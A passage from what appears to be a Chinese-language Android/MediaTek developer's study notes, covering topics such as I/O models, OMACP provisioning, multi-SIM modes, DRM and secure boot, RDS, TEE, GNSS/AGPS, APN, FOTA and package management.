AIO（Asynchronous I/O）：异步非阻塞I/O模型。
那么，同步阻塞、同步非阻塞、异步非阻塞都是怎么回事呢?关于这部分内容也可以查看《漫话：如何给女朋友解释什么是IO中的阻塞、非阻塞、同步、异步?》。

同步阻塞模式：这种模式下，我们的工作模式是先来到厨房，开始烧水，并坐在水壶面前一直等着水烧开。
同步非阻塞模式：这种模式下，我们的工作模式是先来到厨房，开始烧水，但是我们不一直坐在水壶前面等，而是回到客厅看电视，然后每隔几分钟到厨房看一下水有没有烧开。
异步非阻塞I/O模型：这种模式下，我们的工作模式是先来到厨房，开始烧水，我们不一一直坐在水壶前面等，也不隔一段时间去看一下，而是在客厅看电视，水壶上面有个开关，水烧开之后他会通知我。

阻塞VS非阻塞：人是否坐在水壶前面一直等。

同步VS异步：水壶是不是在水烧开之后主动通知人。
```

## [知识点] WatchDog的作用

```text
WatchDog目的是监控系统几个比较主要的service，如果超过一定时间没有反应，认为系统出错，会强制重启Android.

HWT(Hardware Watchdog Timeout)
SWT(Software Watchdog Timeout)
```

## [知识点] UUID

```text
UUID是一个128位长的数字,用16进制表示，然后是电脑随机生成的一个值，是结合机器的网卡、当地时间、一个随机数生成的，能保证3240年不重复，相当于一个永不重复的随机数
```

## [知识点] OMACP(Open Mobile Alliance)

```text
OMA Client Provisioning是一种通过远程服务器对网络内终端进行管理的协议。也能称为OMA DM，即终端管理。这并不算是一个新概念，在国外（主要在日本和美国）已经有成熟的商业应用。但是由于国内环境及运营商的策略，OMA DM在国内迟迟得不到大规模应用。通过OMA DM，服务器可以对终端设备进行固件更新、参数配置、数据采集等各种管理功能。
DM的主要业务有固件更新（类似于Windows的自动更新。如果终端出厂后出现bug，当前的处理方式是进行固件刷新。在国内当前环境下，主要通过各终端客服中心来进行。这样做服务成本很高，终端用户也几乎肯定会为此消耗大量的时间和精力，对品牌形象也是个很不好的影响。特别是对美日的运营商定制方式，运营商会成为舆论及纠纷的中心。而通过DM，用户可以实现通过OTA (over the Air)方式，利用GPRS网络进行固件更新，这无疑大大降低了运营商和厂商的服务成本。随着国内3G时代的到来，运营商订制方式很可能会成为今后的主流，因此国内终端对固件更新的需求会越来越强烈。）、终端参数配置（如果开通过GPRS，就会体验到终端各种参数设置的痛苦。虽然运营商服务人员会不厌其烦地一步一步教你进行GPRS参数设置，但是繁琐的设置总会让人感到厌烦。如果运营商提供了终端参数配置功能，那么只需要告诉运营商你现在上不了网，运营商就会通过DM服务器主动检查你终端上的各个设置参数，并主动帮你设置好。可能你说只是一个GPRS并不是问题，但是3G下会涌现大量业务，视频电话，流媒体，IPTV，定位，个人信息管理(PIM),甚至终端网络游戏……全部打算手动设置吗？）、故障诊断（通过DM，运营商或终端厂商可以得到终端的实际运行状态，并通过采集一些状态数据对终端进行诊断。比如，用户觉得手机的电池质量有问题，那么运营商可以获取终端的电量信息，并以此作为诊断的依据。而依照传统的模式，用户必须将手机拿到客服处进行容量检测，时间从1天起不等。前一种方式在不影响用户使用的情况下实现了故障诊断，而后一种情况则需要浪费用户更多的时间来等待诊断结果，用户体验自不必说。）、参数采集（运营商在布网或网络优化结束后的测试时，或是为了检测某地区网络情况以确定是否需要进行优化或扩容，不要拿着终端和测试设备在各个点寻找信号。但是通过DM，这种情况会有很大改善。通过参数采集，DM服务器可以轻松地将某地区某时段各个手机的信号信息反映给运营商，相当于用户在不知不觉中为运营商充当了信号检测员的工作（当然在此过程中，不会对用户产生任何影响），这样的功能，运营商难道会不感兴趣？）、动态组件及应用管理（通过DM，服务器还可以为用户提供动态组件和应用的管理。比如用户对股市行情感兴趣，那么DM服务器可以动态向用户提供应用程序，使用户在桌面就能了解股市行情。如果用户不想再炒股，而希望显示天起信息，那么DM服务器会删除愿应用，转而控制客户端下载在桌面显示天气预报的应用，而用户自己只需要通过任意途径向运营商反映自己希望的服务即可，不需要用户自己寻找资源，也不需要用户对终端进行管理，一切都由DM服务器帮你搞定。）。

Omacp是一个功能，相当于是运营商给你发一个ota指令或者一条短信，你点击短信后会自动去更新运营商要求你更新的apn
1、现有的状态：接收到Omacp后作为新的APN直接添加到数据库中，如有你要直接接收到Omacp设置APN信息后,用新的APN替换原有的APN，请参考[FAQ18292] Omacp Apn信息替换原有APN
2、[FAQ09453] Omacp协议版本及可以支持的配置内容
3、如果要有该功能的话，要打开MTK_OMACP_SUPPORT、MTK_OMADRM_SUPPORT、MTK_OMA_DOWNLOAD_SUPPORT的宏
4、在某些国家Email参数SMTP不同，导致在收到Omacp message中含有Email参数的时候，配置无法安装。Omacp出错log如下：
ActivityManager: Broadcast: Intent { act=com.mediatek.omacp.settings.result (has extras) } ordered=false callerApp=ProcessRecord{40b3cbd8 6138:com.android.email/10014}
Omacp/OmacpMessageSettingsDetail: OmacpMessageSettingsDetail result received, appId is : 25 result is : false
可参考[FAQ11680] 由于Email参数SMTP_APPID不同，导致Omacp配置email失败的修改方法
5、要接收到omacp的短信，一般都要有自己源生的短信apk，如果用google短信是不行的，如果只有google短信，修改OmacpMessageNotification.java的updateNotification函数,将
otherAppContext = context.createPackageContext("com.android.mms",Context.CONTEXT_IGNORE_SECURITY);
修改成
otherAppContext = context.createPackageContext("com.google.android.apps.messaging",Context.CONTEXT_IGNORE_SECURITY);
```

## [知识点] ss,dsds/dsda,tsts,qsqs

```text
ProjectConfig.mk        MTK_MULTI_SIM_SUPPORT
1.ss -单卡单待single standby
2.dsds/dsda -双卡 （区别：dsds双卡双待Dual SIM Dual Standby，dsda双卡双通Dual SIM dual active，我们公司基本都是dsds)
双卡双待又可以分双模双待，双网双待，双待单通，双待双通等。   就是可以2个号码同时拨通并可以同时通话的。
中国移动使用的GSM(2G)/TD-SCDMA(3G)/TD-LTE(4G)这3模；
中国联通使用的是GSM(2G)/WCDMA(3G)/TD-LTE(4G)/FDD-LTE(4G)；
中国电信则使用的是CDMA1X(2G)/EVDO(3G)/TD-LTE(4G)/FDD-LTE(4G)。
对于国内的运营商来说，只要达到7模即GSM/TD-SCDMA/WCDMA/TD-LTE/FDD-LTE/CDMA1X/EVDO即可称之为全网通机型。 [1] 
3.tsts -三卡三待 Triple Sim Triple Standby
4.qsqs -四卡四待 Quatre Sim Quatre Standby

比如双卡双待配置：MTK_MULTI_SIM_SUPPORT = dsds
```

## [知识点] Android 手机上的 USB MIDI 是做什么用的?怎么用?

```text
google 从 M 平台开始就有这一功能，这个功能是USB可以插入MIDI 键盘，手机就会成为音源，弹奏键盘，手机就能发出声音
```

## [知识点] PTP

```text
图片传输协议英文全称为：Picture Transfer Protocol，缩写为PTP。 ptp是由柯达与微软协商制定的一种标准，符合这种标准的图像设备在接入windows xp系统之后可以更好地被系统和应用程序所共享，尤其在网络传输方面，系统可以直接访问这些设备用于建立网络相册时图片的上传、网上聊天时图片的传送等。
```

## [知识点] MTP

```text
媒体传输协议（英语：Media Transfer Protocol，缩写：MTP）是一个基于图片传输协议（PictureTransferProtocol，PTP）的自定义扩展协议。该协议允许用户在移动设备上线性访问媒体文件。PTP只是被设计用于从数码相机下载照片，而MTP可以支持数字音频播放器上的音乐文件和便携式媒体播放器上的媒体文件，以及个人数字助理的个人信息的传输。MTP是WMDRM10-PD的一个关键部分，而WMDRM10-PD是WindowsMedia的一项数字版权管理（DRM）服务。
```

## [知识点] DRM

```text
DRM，英文全称Digital Rights Management, 可以翻译为：数字版权管理。 由于数字化信息的特点决定了必须有另一种独特的技术，来加强保护这些数字化的音视频节目内容，文档、电子书籍的版权，该技术就是数字权限管理技术---DRM（Digital rights management）。
```

## [知识点] widevine和secureboot

```text
数字版权管理 Digital Rights Management----简称DRM，这个google的默认都有，而且打开了，但是怎么保护这个DRM，这时候就需要使用widevine技术了。
DRM 是一系列访问控制技术的集合，它不仅用来控制对作品或设备的拷贝。而且也控制使用、查看、打印及修改等内容。最简单的话说对那些音乐，视频，电子书，游戏等很容易被复制的内容进行控制，防止盗版。MTK平台，实现DRM保护使用的就是widevine技术。
因此widevine与secure boot的关系是：其实两者是两个不同的东西。widevine只是一家提供了相应DRM解决方案的公司，我们提到widevine，是指该公司提供的解决方案，它实现了Android平台的版权保护，它针对数字媒体提供了与格式无关的加密解密方式来保护版权。而secure boot是mtk的在刷机，启动，升级等过程中的安全机制，只是两者绑定了。我们要想启用widevine，必须enable serure boot。

ps：widevine的机制本身就存在，但是必须打开serure boot才能启用。

当终端产品enable了该功能，相关的安全机制如下。
1）：Secure Download Check:编译时期，image会被客户的key签名。而Flashtool在下载时，会检查签名。
2）：Secure Boot Check：终端在启动时，image也会被检查key签名。如果检查失败， 那终端启动会失败。
3）：Secure Version Check：image会配置security version number和custom name，下载的时候，会被检查。（可以高，不能低）。
```

## [知识点] DuraSpeed（快霸）功能   ----> [FAQ19932] 快霸(DuraSpeed)功能介绍

```text
DuraSpeed 是 MTK 开发的进程管理软件, 目的是“缓解手机长时间使用后的性能下降”.
DuraSpeed 在 APP 启动时开始执行, 在后台限制“被保护之外”的进程. 从而为前台进程提供更多的系统资源.
DuraSpeed 有一套进程保护规则, 并提供 APP List 允许使用者编辑应用保护列表.
快霸透过抑制后台应用的活动来加速前台应用的速度，但可能导致部分通知无法正常接收
ps：这是一个apk，无源码，路径在alps/vendor/mediatek/proprietary/packages/apps/RunningBooster
```

## [知识点]  [FM] FM/AM

```text
FM(Frequency Modulation)
调频广播（英语：Frequency Modulation Broadcast，常缩写为FM广播）是一种以频率调制技术来传送高保真声音的无线电广播技术，由埃德温·霍华德·阿姆斯特朗（Edwin Howard Armstrong）发明。

AM和FM调制信号用于无线电。AM（幅度调制）和FM（频率调制）是调制类型（编码）。通常来自录音室的来自节目资料的电信号与特定频率的载波混合，然后进行广播。在AM的情况下，根据原始信号，通过改变载波的幅度随时间完成该混合（调制）。在FM的情况下，载波的频率是变化的。无线电接收机（“收音机”）包含一个解调器，用于从广播波中提取原始节目素材。
```

## [知识点]  [RDS]  [FM] FM中的RDS功能  ----> 目前MTK的chip都是支持RDS功能的

```text
Radio Data System无限数据广播系统，是英国BBC广播公司开发的一种特殊无线电广播，它是在调频广播发射信号中利用副载波把电台名称，节目类型，节目内容及其它信息以数字形式发送出去。通过具有RDS功能的调谐器就可以识别这些数字信号，并做响应处理，RDS广播精髓在于其AF和TA功能，AF既自动频率调整，当信号低于某个水平时，AF功能会自动搜索当前电台的其他发射频率串。RDS收音系统还独有“交流信息”功能（TA功能，也称交通公告），若有紧急事件，电台就会发送特殊信号，令收音机强行播放，另外，还有时间基准发射，自动调准收音机时间等功能，RDS在汽车，手机等移动设备上使用很方便。它有一个优先权的设定特点，你可以设定你喜欢的电台频道，如体育、新闻或军事等，当你的机子收到你所设定的频道信号时，机子正在工作的内容会中止，转而播出这方面的信息。它是数字可字母显示的，没有声音。还有一种功能就是警告中断,当路面有事故发生，电台会播送信号，机子收到就会显示出来，你就可以走别的路了。

一、支持RDS(Radio data System)功能的FM收音机就是指具有“无线数据广播系统”功能的收音机。
二、所谓RDS是英国BBC广播公司开发的一种特殊无线电广播。即“无线数据广播系统”（Radio Data System). 它是在调频广播发射信号中利用副载波把电台名称，节目类型，节目内容及其它信息以数字形式发送出去。通过具有RDS功能的调谐器就可以识别这些数字信号，并做响应处理，RDS广播精髓在于其AF和TA功能，AF既自动频率调整，当信号低于某个水平时，AF功能会自动搜索当前电台的其他发射频率串。
三、RDS收音系统还独有“交流信息”功能（TA功能，也称交通公告），若有紧急事件，电台就会发送特殊信号，令收音机强行播放，另外，还有时间基准发射，自动调准收音机时间等功能，RDS在汽车，手机等移动设备上使用很方便。
四、目前国内支持RDS的电台已知的有：
上海 FM91.4 中央人民广播电台经济之声
北京 FM88.7 中国国际广播电台 HIT FM
上海 FM87.9 中国国际广播电台 HIT FM
广州 FM88.5 中国国际广播电台 HIT FM


[FAQ03851]  [FM]  打开/关闭RDS方法

目前没有宏来切换RDS的开启与关闭，如果需要修改的话必须通过修改代码来完成。具体如下：
1、Fmradioservice在启动过程中会调用isRDSSupported（）从而调用native 层的isRDSsupport()来获取RDS的开关状态，如下代码片段：
public boolean isRDSSupported() {
    boolean isRDSSupported = (FMRadioNative.isRDSsupport() == 1);
    LogUtils.d(TAG, "FMRadioService.isRDSSupported: " + isRDSSupported);
    return isRDSSupported;
} 直接修改上层APK上的接口isRDSSupported即可。

2、Natvie 层isRDSsupport()会调用drivr端的设定，如下：

case FM_IOCTL_RDS_SUPPORT: {
    fm_s32 support = FM_RDS_ENABLE;
    WCN_DBG(FM_NTC | MAIN, "FM_IOCTL_RDS_SUPPORT\n");
    if (copy_to_user((void*)arg, &support, sizeof(fm_s32))) {
        ret = -EFAULT;
        goto out;
    }
    break;
由上面这段代码可以看到driver端默认RDS为打开状态。

通过以上的描述可以看到，打开/关闭 RDS有两种方式：

方法一：在 Fmradioservice --> isRDSSupported 中直接将变量isRDSSupported值修改掉。0：关闭RDS，1：打开RDS

方法二： 修改driver端的设定，即native层将case FM_IOCTL_RDS_SUPPORT中fm_s32 support = FM_RDS_ENABLE值改掉， 0：关闭RDS， 1：打开RDS
```

## [知识点] PAI

```text
如果一个apk是在system区的，另一个apk是在data区的，当两个apk的包名都相同且版本号不一样的时候，在data区的apk也算是在system区且会直接覆盖system区里面的apk
ps：详细见PAI原理
```

## [知识点] TEE

```text
TEE(Trusted Execution Environment)，可信执行环境，该环境可以保证不被常规操作系统干扰的计算，因此称为”可信”。这是通过创建一个可以在TrustZone的”安全世界”中独立运行的小型操作系统实现的，该操作系统以系统调用(由TrustZone内核直接处理)的方式直接提供少数的服务。另外，TrustZone内核可以安全加载并执行小程序”Trustlets”，以便在扩展模型中添加”可信”功能。Trustlets程序可以为不安全(普通世界)的操作系统(如Android)提供安全的服务。

TEE通常用于运行关键的操作：(1)、移动支付：指纹验证、PIN码输入等；(2)、机密数据：私钥、证书等的安全存储；(3)、内容包括：DRM(数字版权保护)等。

关于tee
如何查看tee.bin的版本?
 ---> 在终端中执行如下密令：strings tee.bin | grep "gp" （其中tee.bin就是客户提供的tee.bin文件）,出来的结果就是tee的版本
如何查看preloader是否升级上去?
 ---> 可以抓取升级前后的串口log，在log中搜索[TZ_INIT]  TEE start entry即可，看看起始地址是否相同
```

## [知识点] subid和slotid区别

```text
slotid或者phoneid是指卡槽，双卡机器卡槽一值为0，卡槽2为1，依次类推，不过国内也就双卡和单卡机器了，三卡机器只听说在遥远的印度有。

subid用过数据库的同学比较好理解，subid就是主键递增项，值从1开始，机器每插入一个新卡（iccid是没有见的，值就会加1，iccid每个sim卡是唯一的）。插入双卡后数据库中就会有subid值为1和2的两个数据条目，拔卡插卡交换卡槽数据库并不会增加新项，只有插入一张新的sim卡才会增加一条id为3的数据条目

subid是跟卡走的，slotid是跟卡槽走的。一般来说slotid比较好理解，subid不好理解。

Android5.0之后google终于加入了多sim卡的代码，5.0之前的多卡（一般也就是双卡）机制是各写各的，mtk和高通的代码各有千秋，但是基本上用slotid较多，subid只有mtk在用也很少。Google一统千秋后subid反而用的比slotid多了，

三方app获取slot和subId
这个小节是针对文章下面的评论加的。

frameworks/base/telephony/java/android/telephony/SubscriptionManager.java

public int getDefaultDataPhoneId() 　默认数据slotId
public static int getDefaultDataSubscriptionId()　默认数据subId
public int getDefaultSmsPhoneId() 　默认短信slotId 
public static int getDefaultSmsSubscriptionId() 默认短信subId
public static int getDefaultVoicePhoneId() 　默认通话slotId
public static int getDefaultVoiceSubscriptionId() 默认通话subId
public static int getDefaultSubscriptionId()　获取默认subId，上述三个都返回-1的话使用这个
双卡设置中短信和通话的设置只是设置SettingsProvider中的一个字段，而设置数据业务卡槽除了设置数据库字段外还会导致modem的重启、网络类型切换（数据业务卡能上4G，而另一张卡只能用2G）等一系列操作。所以手机开发厂商一般说主卡就是数据业务卡。
```

## [FAQ03558]  [知识点] Bluetooth蓝牙协议有哪些???分别有什么用???

```text
[FAQ03558]  [Settings] 6573 & 6575平台支持哪些蓝牙Profile
OPP   ：Object Push Profile
SIMAP ：SIM Access Profile
PRXM  ：Proximity Monitor
PRXR  ：Proximity Reporter
HIDH  ：Human Interface Device Host
FTP   ：File Transfer Profile
PBAP  ：Phone Book Access Profile
BPP   ：Basic Printing Profile
BIP   ：Basic Imaging Profile
DUN   ：Dial-up Networking
PAN   ：Personal Area Network
HFP   ：Hands-free Profile
A2DP  ：Advanced Audio Distribution Profile
AVRCP ：Audio/Video Remote Control Profile
MAPS  ：Message Access Profile (Server)
SPP   ：Serial Port Profile
```

## [知识点] 宏内核/微内核

```text
微内核 是将各种服务功能放到内核之外,自身仅仅是一个消息中转战,用于各种功能间的通讯.
宏内核 是将所有服务功能集成于一身,使用时直接调用.

微内核定义：

内核管理着所有的系统资源，在微内核中用户服务和内核服务在不同的地址空间中实现。在应用程序和硬件的通信中，内核进程和内存管理的极小的服务，而客户端程序和运行在用户空间的服务通过消息的传递来建立通信，它们之间不会有直接的交互，这样一来，微内核中的执行速度相对就比较慢了，这是微内核架构的一个缺点。

在内核架构中，用户服务是独立于内核服务的，因此任何用户服务崩溃都不会影响到内核服务，这就加强了操作系统的健壮性，这是微内核的优势所在。另一点，微内核的扩展性强，添加一个功能，只需要建立一个新的服务到用户空间当中，而内核空间不需要任何的修改。因此，微内核可移植性强、安全并且易于扩展。

宏内核定义：

宏内核同样管理着用户程序和硬件之间的系统资源，但是和微内核不一样的是，在宏内核架构中，用户服务和内核服务在同一空间中实现。具体一点，就是内核可以代表内核进程运行代码，就是通常的内核进程；当用户进程经过系统调用或者中断进入到内核态时，内核也可以代表它运行代码。这样一来，宏内核需要管理的资源多于微内核，其大小就相对大一些了。

在宏内核架构当中，内核管理着CPU调度，内存管理，文件管理和系统调用等各模块的的工作，由于用户服务和内核服务被实现在同一空间中，这样在执行速度上要比微内核快。然而，宏内核的劣势也是显而易见的，那就是当内核中的某个服务崩溃了，整个内核也会崩溃。另一点，想要在内核中添加新的功能就意味着内核中的各个模块需要做相应的修改，因此其扩展性很弱。

Android 是基于 Linux 的宏内核
Fusion 和 鸿蒙 是基于 微内核
```

## [知识点] 文字识别OCR

```text
1. 功能:
光学字符识别(OCR,Optical Character Recognition)是指对文本资料进行扫描,然后对图像文件进行分析处理,获取文字及版面信息的过程
2. 典型应用:
名片扫描
3. android 源码实现:
external/tesseract/*
4. 编译:
$ cd external/tesseract/
$ mm
生成 libocr.so,push 系统/system/lib/中,它也可以放在软件的安装包里
5. 例程下载:
1) 在此下载
http://code.google.com/p/mezzofanti/
2) 直接下载 apk 是能用的, 在源码中编译程序运行就退出,是由于可能 libocr.so 未安装, 把它 push 到系统中即可
$ adb push libocr.so /data/data/com.itwizard.mezzofanti/lib/
3) 主要借鉴 OCR.java 它是对 libocr.so 库的调用(JNI 方式)
```

## [知识点] GNSS

```text
卫星导航系统（Global Navigation Satellite System,GNSS）是覆盖全球的自主地利空间定位的卫星系统，允许小巧的电子接收器确定它的所在位置（经度、纬度和高度），并且经由卫星广播沿着视线方向传送的时间信号精确到10米的范围内。接收机计算的精确时间以及位置，可以作为科学实验的参考。

截至2019年，只有美国的全球定位系统 （GPS；共由24颗卫星组成）、俄罗斯的格洛纳斯系统（GLONASS）和中国的北斗卫星导航系统（BDS）[1] 覆盖全球。欧洲联盟的伽利略定位系统则为在初期部署阶段的全球导航卫星系统，预定最早到2020年才能够充分的运作[2] 。一些国家，包括法国、日本和印度[3] ，都在发展区域导航系统。

全球卫星导航系统国际委员会认定系统
美国：全球定位系统（GPS）
俄罗斯：全球导航卫星系统（GLONASS）
中国：北斗卫星导航系统 （BDS）
欧盟：伽利略定位系统
区域型卫星导航系统
印度：印度区域导航卫星系统（IRNSS）
日本：准天顶卫星系统（QZSS）是美国GPS的辅助系统
```

## [知识点] GPS简介

```text
卫星定位
1. gps 说明
1) 原理
每一卫星播发一个伪随机测距码信号,该信号大约每 1 毫秒播发一次。接收仪同
时复制出一个同样结构的信号并与接收到的卫星信号进行比较,由信号的延迟时
间(dT)推算出卫星至 接收仪的距离
2) 述语
TTFF:首次定位时间
PRN:伪随机码,用于辨别是哪颗卫星
SNR:信噪比
2. android 对 gps 的内部支持
1) 位置服务
android 对卫星定位的支持名字叫位置服务,可以通过设置来打开或关闭它
2) android 实现
frameworks/base/location/java/android/location/LocationManager.java 接口
frameworks/base/services/java/com/android/server/LocationManagerService.java 服务
frameworks/base/core/jni/android_location_GpsLocationProvider.cpp 等待 gps 事件,
发给 service
libhardware_legacy/include/hardware_legacy/gps.h 定义了底级 gps 的实现,不同硬
件以不同方式实现它,它可能是对设备的访问,也可能与 modem 通过 rpc 通讯得
到 gps 数据
3) 应用程序调用接口
frameworks/base/location/java/android/location/*.java
LocationManager.java 是最重要的接口,通过它访问 gps 定位资源
LocationListener.java 是定位的回调函数,通过实现它来接收定位数据
Gps*.java 提供了获取当前 gps 信息的接口,包括捕获的卫星数,信噪比等
4) 调试
想要调试 gps,可以把/system/etc/gps.conf 中的 debug 等级调为 5,此时你可以在
logcat 中看到全部的 gps 信息
在室内基本没有信号,窗边效果也不好,建议在室外,至少是站在阳台上测试
3. 例程
1) 功能
显示当前经纬度及搜到的卫星个数
2) 可从此处下载可独立运行的代码
http://download.csdn.net/source/2598910

4. 辅助工具
定位程序要么带地图很大,要么太简单不能得到足够数据。推荐gpslogger,使用它可
以看到当前的经纬度,速度,信号强度,当前搜到了几颗星(搜到小于三颗星时,定
位不到经纬度),帮助进一步定位问题。
http://gpslogger.codeplex.com/可以下载到它的源码
5. 参考
1) gps术语
http://www.mobile01.com/newsdetail.php?id=257
```

## [知识点] BDS

```text
北斗卫星导航系统由空间段、地面段和用户段三部分组成，可在全球范围内全天候、全天时为各类用户提供高精度、高可靠定位、导航、授时服务，并具短报文通信能力，已经初步具备区域导航、定位和授时能力，定位精度为分米、厘米级别，测速精度0.2米/秒，授时精度10纳秒
```

## [知识点]  [FAQ02934] MTK EPO

```text
这项技术是通过MTK相关的设备，通过预测技术，将未来一段时间内的卫星星历数据放到mtk服务器，然后手机端可以从该服务器下载，这样，在没有A-GPS去supl服务器下载卫星星历数据的情况下，也可以实现快速定位。

如果手机端同时开启EPO和Agps，那么GPS首先考虑利用EPO进行辅助定位。
```

## [知识点] AGPS

```text
AGPS简介

AGPS（AssistedGPS：辅助全球卫星定位系统）是结合GSM/GPRS与传统卫星定位，利用基地台代送辅助卫星信息，以缩减GPS芯片获取卫星信号的延迟时间，受遮盖的室内也能借基地台讯号弥补，减轻GPS芯片对卫星的依赖度。日本和美国都已经成熟运用AGPS于LBS服务（LocationBasedService，适地性服务）。
AGPS解决方案的优势主要在其定位精度上，在室外等空旷地区，其精度在正常的GPS工作环境下，可达10米左右，堪称目前定位精度最高的一种定位技术。该技术的另一优点为：首次捕获GPS信号的时间一般仅需几秒，不像GPS的首次捕获时间可能要2～3分钟。
 
A-GPS设置中“网络定位请求”一项，有什么功能?
AGPS定位数据主要主要依赖于网络服务器，可以通过wifi或者3G、4G连接到提供定位数据的免费服务器（比如supl.nokia.com.）获取定位，同时因为可以根据机器连接的附近基站位置，提供更高精度的定位。

A-GPS模式分两种

SI 模式：用户发起定位请求。
NI 模式：服务器发起定位请求。(开启网络定位请求项) 这个情况下，网络端会通过wap push的方式给手机，手机收到后，会发GPS设备进行定位，然后将获得的位置再送回给网络服务器。
开启网络定位请求,就是可以让A-GPS工作在NI模式。
目前NI定位只适用于实验室或者欧美一些国家的运营商网络。
```

## [知识点] SUPL(安全用户平面定位)

```text
Secure User Plane Location
```

## [知识点] APN(Access Point Name)

```text
APN指一种网络接入技术，是通过手机上网时必须配置的一个参数，它决定了手机通过哪种接入方式来访问网络。
对于手机用户来说，可以访问的外部网络类型有很多，例如：Internet、WAP网站、集团企业内部网络、行业内部专用网络。而不同的接入点所能访问的范围以及接入的方式是不同的，网络侧如何知道手机激活以后要访问哪个网络从而分配哪个网段的IP呢，这就要靠APN来区分了，即APN决定了用户的手机通过哪种接入方式来访问什么样的网络。
```

## [知识点] SPN

```text
SPN：(Service Provider Name)就是当前发行SIM卡的运营商的名称（CHN-UNICOM）
```

## [知识点] VPN

```text
Virtual Private Network
```

## [知识点] Android多媒体

```text
1. android 多媒体介绍
android 的多媒体功能基于 PacketVideo 的 OpenCORE。这些库支持播放和录制许多流
行的音频和视频格式,以及静态图像文件,包括 MPEG4、 H.264、 MP3、 AAC、
AMR、JPG、PNG,底级实现在源码的 external/opencore 中

2. android 框架对多媒体的支持
应用程序调用接口s
frameworks/base/media/java/android/media/MediaPlayer.java

3. 例程
1) 功能
播放编辑框中指定的多媒体文件
2) 可从此处下载可独立运行的代码
http://download.csdn.net/source/2602127
3) 核心代码及说明

4. 参考:
1) Android 源码自带的多媒体播放例程
development/samples/ApiDemos/src/ocm/example/android/apis/media/MediaPlayerDe
mo*
2) 流媒体例程
http://kuikui.javaeye.com/blog/325916
```

## TODO : [知识点]  [图片] 图片格式？

```text
.9.PNG
BMP

JPEG：全称Joint Photographic Expert Group，即联合照片专家组；文件后辍名为".jpg"或".jpeg"；是一种有损压缩格式，压缩比率通常在10：1到40：1之间，压缩比越大，品质就越低
PNG：全称Portable Network Graphics，即便携式网络图形；文件后缀名为“.png”；是一种无损压缩格式，支持高级别无损耗压缩和alpha 通道透明度，主要用于小图标，透明背景等；但是其压缩比没有jpeg大，且色彩复杂情况下压缩后文件较大
WEBP：由Google推出的新格式，同时提供了有损压缩与无损压缩；无损压缩，相同质量的webp比PNG小大约26%；有损压缩，相同质量的webp比JPEG小25%-40%，但是WebP格式图像的编码时间比JPEG格式图像长8倍； 支持GIF
其中JPEG有一个升级版JPEG2000，其压缩率比JPEG高约30%左右，同时支持有损和无损压缩。JPEG2000格式有一个极其重要的特征在于它能实现渐进传输，即先传输图像的轮廓，然后逐步传输数据，不断提高图像质量，让图像由朦胧到清晰显示
```

## [知识点] 包管理PackageManager

```text
1. 说明
包管理(Package manager)非常重要,它关系着软件包的安装,卸载,查看和使用,它是运行在后台的一个服务,名叫 PackageManagerService,包括对软件包的解包,验证,安装等
2. 系统软件包管理信息存储在哪
/data/system/packages.xml
通过它可以看到系统安装的所有软件包,以及软件包的信息
3. 包管理相关源码在哪
frameworks/base/services/java/com/android/server/PackageManagerService.java
4. 系统自带的软件能升级吗(即安装在系统分区 system 中的包,如电话,短信)
可以升级,如果升级/system/app 目录中的包,PackageManagerServer.java 对此情况进行处理,被升级的包出现 package.xml 的 updated-package 字段中,新的包信息会写在package 字段中,卸载新包后,原包会恢复到 package 字段中。启动时新的包会优先地被启动
5. 为什么安装软件时会报错
1) 版本不匹配
比如在 2.2 的 SDK 上编译的软件,不能在 1.6 上安装, AndroidManifest.xml 中可以对版本所安装系统的版本进行指定
2) 签名信息不匹配
软件升级时会做签名信息对比,如果前后两个包签名不一致,则不能安装
3) 包完整性不满足
签名是对包中每个文件进行的,它的压缩格式是 zip,如果手工解包后替换了某文件再打包,被替换的文件与签名验证不一致,则不能安装
4) 格式不对
有些从网上下载的包可能打了多层压缩,比如又将 apk 打包成了 rar 格式,建议解压缩看一下格式再安装
6. 包的权限
1) 软件在 AndroidMenifest.xml 中都会指明其需要的权限,安装包时图形界面也通常显示出它所需要的权限,供用户判断是否安装
2) 特殊情况
有些软件没有说明需要访问 SD 卡和打电话的权限,但安装后却出现此权限。
当使用旧的SDK所做的包向新的SDK安装时,可能出现这种情况,见
framework/base/core/java/android/content/pm/PackageParser.java中的NEW_PERMISSION,此处判断编译使用的 SDK 版本是否在 android1.6 之前
(DONUT),如果在之前就加入这两个权限。
```

## [知识点] FOTA

```text
空中升级Fota
1. 简介
fota(Firmware Over The Air),移动终端空中下载软件升级技术。原理是根据算法把新
旧版本之间的差别做成一个软件包,手机从服务器上下载到手机里,由手机完成软件
版本的升级
2. 用户操作
1) 设置->关于手机->检查更新,检查是否有更新版本。
2) 可以使用默认设置自动更新:设置->关于手机->自动系统检查
3. 升级过程
MT710 的 FOTA 由中国移动服务器发起,服务器发送 FOTA 信息到手机,手机收
到信息并确认后,手机将自动上网下载升级包,下载后,手机将重启完成软件的更新。
用户需要按照手机的提示,确认下载和安装即可,不需要其他操作,也不需要对手机
进行特殊设置。下载中断时手机会自动续接,直到下载完毕。在手机 FOTA 过程中,
需要保持手机在网络良好的连接状态,电池电量充足。
4. Fota 的相关源码
1) 升级界面
package/app/Fota/*
2) 系统层
system/core/fota/*
3) 底层库支持
external/fotalib/*
4) fota 分区
因为像 boot.img 需要在系统之前修改,所以有 fota 启动方式
bootable/bootloader/legacy/fota*

Common types of OTA upgrade include GOTA(Google OTA)，MOTA(MTK OTA), 
Adups Fota(广升FOTA), Redbend FOTA and customer-developed FOTA

几种OTA方案对比
              Developer   Cost                      MTK has Source code
GOTA          Google      get license from google   no
MOTA          MTK         free                      yes
Adups FOTA    Adups       get license from Adups    no
Redbend FOTA  Redbend     get license from Redbend  no
```

## [知识点] OTG

```text
OTG是On-The-Go的缩写，是近年发展起来的技术。2001年12月18日由USB Implementers Forum公布，主要应用于各种不同的设备或移动设备间的联接，进行数据交换。
特别是Pad、移动电话、消费类设备。改变如数码照相机、摄像机、打印机等设备间多种不同制式连接器，多达7种制式的存储卡间数据交换的不便。2014年左右开始在市场普及。
```

## [知识点] 串口通信 android-serialport-api

```text
串口通信(Serial Communication)， 是指外设和计算机间，通过数据信号线 、地线、控制线等，按位进行传输数据的一种通讯方式。这种通信方式使用的数据线少，在远距离通信中可以节约通信成本，但其传输速度比并行传输低。

